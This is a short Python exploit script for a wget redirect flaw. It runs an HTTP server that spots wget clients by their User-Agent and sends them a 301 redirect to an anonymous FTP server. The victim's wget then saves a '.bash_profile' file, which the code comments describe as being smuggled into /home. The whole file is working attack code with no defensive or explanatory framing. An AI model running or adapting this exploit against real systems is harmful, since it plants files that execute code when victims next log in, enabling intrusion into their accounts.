
import http.server
import socketserver
import socket
import sys


HTTP_IP = '127.0.0.1'
HTTP_PORT = 2333
FTP_IP = '127.0.0.1'
FTP_PORT = 1026
EXPLOIT_FILE = '.bash_profile'


class WgetExploit(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print('incoming GET request @ %s' % self.path)
        if 'wget' not in self.headers.get('User-Agent').lower():
            print('user not a wget victim, skipping')
            self.send_response(200)
            self.end_headers()
            self.wfile.write('nothing here, go away')
            return
        # force redirect
        self.send_response(301)
        print('smuggling file %s into /home' % EXPLOIT_FILE)
        new_path = 'ftp://anonymous@%s:%d/%s' % (
            FTP_IP, FTP_PORT, EXPLOIT_FILE)
        print('redirecting to %s' % new_path)
        self.send_header('Location', new_path)
        self.end_headers()
        return
    pass


def pwn() -> None:
    # check ftp server status
    print('check ftp server status')
    _sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _res = _sock.connect_ex((FTP_IP, FTP_PORT))
    if _res == 0:
        print('ftp server open on %s:%d' % (FTP_IP, FTP_PORT))
    else:
        print('ftp server is down QwQ')
        return
    # open up http server
    handler = socketserver.TCPServer((HTTP_IP, HTTP_PORT), WgetExploit)
    print('serving wget exploit on %s:%s...' % (HTTP_IP, HTTP_PORT))
    handler.serve_forever()
    return


if __name__ == '__main__':
    pwn()
